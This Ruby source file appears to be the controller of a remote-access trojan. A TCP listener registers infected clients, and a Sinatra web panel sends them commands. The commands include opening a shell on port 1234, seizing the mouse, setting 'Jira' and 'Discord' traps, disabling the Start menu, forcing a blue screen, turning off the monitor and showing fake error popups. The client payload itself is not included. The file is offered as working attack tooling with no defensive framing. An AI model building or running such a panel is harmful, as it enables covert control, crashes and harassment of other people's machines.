require_relative('app/controllers/controller')

#TCP Server variables
$stdout.sync = true
server = TCPServer.new('0.0.0.0', 55555)

#Threads variables
$loopThread = Thread.new { sleep }
$semaphore = Mutex.new

#Global lists
$clientsList = []

$loopThread = Thread.new {
  loop do
    Thread.start(server.accept) do |client|
      begin
        #Always need to synchronize global array
        $semaphore.synchronize { $clientsList << Client.new(client) }
        while line = client.gets
          if line[0..10] == "Polaczono z"
            $semaphore.synchronize { $clientsList[Client.num].name = line[12..-2] }
          end
        end
      rescue
        Client.dead
      end
    end
  end
  server.close
}


class MyServer < Sinatra::Base

  configure do
    set :run            , 'true'
    set :public_folder  , 'public'
    set :views          , 'app/views'
    set :port           , '80'
    set :bind           , '0.0.0.0'
    set :show_exceptions, 'true' #Those are errors
  end

  get '/' do
      erb :home
  end

  get '/panel' do
    if params.empty? || $clientsList[params[:client].to_i].nil?
      @error = "Did not found client!"
      erb :home
    else
      @css = ["panel-styles"]
      erb :panel, locals: {params: params}
    end
  end

  post '/vcontrol' do
    if params.empty? || $clientsList[params[:client_id].to_i].nil?
      @error = "Did not found client!"
      erb :home
    else
      @mClient = $clientsList[params[:client_id].to_i]
      case params[:request]
      when "volup"
        $semaphore.synchronize { @mClient.volume_up }
      when "voldw"
        $semaphore.synchronize { @mClient.volume_down }
      when "mute"
        $semaphore.synchronize { @mClient.volume_mute }
      end
    end
  end

  get '/volcontrol' do
    @css = ["vol_control-styles","site-after-styles"]
    erb :vol_control, locals: { params: params }
  end

  get '/generate_error' do
    @css = ["error-generator-styles","site-after-styles"]
    erb :error_generator, locals: { params: params }
  end

  post '/generate_error' do
    if params.empty? || $clientsList[params[:client_id].to_i].nil?
      @error = "Did not found client!"
      erb :home
    else
      @mClient = $clientsList[params[:client_id].to_i]
      @sendText = "#{params[:text].gsub(",","")},#{params[:title].gsub(",","")},"
      if !params[:buttons].nil?
        @sendText = @sendText + params[:buttons]
      else
        @sendText = @sendText + "0"
      end
      if !params[:icons].nil?
        @sendText = @sendText + "," + params[:icons]
      end
      if params[:text].length > 1000 || params[:title].length > 100
        @error = "Params too long!"
      else
        $semaphore.synchronize { @mClient.send_error(@sendText) }
      end
    end
    @css = ["panel-styles"]
    erb :panel, locals: {params: params}
  end

  post '/execute' do
    if params.empty? || $clientsList[params[:client_id].to_i].nil?
      @error = "Did not found client!"
      erb :home
    else
      @mClient = $clientsList[params[:client_id].to_i]
      case params[:request]
      when "shell"
        $semaphore.synchronize { @mClient.shell }
        @msg = "Trying open shell on port 1234 from #{@mClient.name}."
      when "get-mouse"
        if @mClient.mouseTaken == 0
          $semaphore.synchronize { @mClient.get_mouse }
          @msg = "Trying to get mouse on #{@mClient.name}."
        else
          $semaphore.synchronize { @mClient.give_mouse_back }
          @msg = "Giving mouse back to #{@mClient.name}."
        end
      when "trap-jira"
        if @mClient.jiraTrap == 0
          $semaphore.synchronize { @mClient.trap_on_jira }
          @msg = "Settting on Jira trap on #{@mClient.name}."
        else
          $semaphore.synchronize { @mClient.trap_off_jira }
          @msg = "Killing Jira trap on #{@mClient.name}."
        end
      when "take-over-menustart"
        if @mClient.menuStart == 0
          $semaphore.synchronize { @mClient.get_menu_start }
          @msg = "Killing Menu Start on #{@mClient.name}."
        else
          $semaphore.synchronize { @mClient.give_back_start }
          @msg = "Giving back Menu Start on #{@mClient.name}."
        end
      when "set-discord-trap"
        if @mClient.discordTrap == 0
          $semaphore.synchronize { @mClient.set_discord_trap }
          @msg = "Settin on Discord Trap on #{@mClient.name}."
        else
          $semaphore.synchronize { @mClient.discard_discord_trap }
          @msg = "Turning off Discord Trap on #{@mClient.name}."
        end
      when "melt-monitor"
        $semaphore.synchronize { @mClient.melt_monitor }
        @msg = "Trying to melt #{@mClient.name}\'s screen. \n
        WARNING: This function has first false positive!"
      when "bsod"
        $semaphore.synchronize { @mClient.bsod }
        @msg = "Trying nevermind... #{@mClient.name} is just dead."
      when "turnoffMonitor"
        $semaphore.synchronize { @mClient.turn_off_monitor }
        @msg = "Turning off monitor on #{@mClient.name}..."
      else
        @msg = "Błedne polecenie."
      end
      @css = ["site-after-styles"]
      erb :site_after, locals: {params: params}
    end
  end

  helpers do
    def current_user
      if session[:user_id]
        $usersDB.where(:id => session[:user_id]).all[0]
      else
        nil
      end
    end
  end

  not_found do
    status 404
    redirect '/'
  end

  run!
end
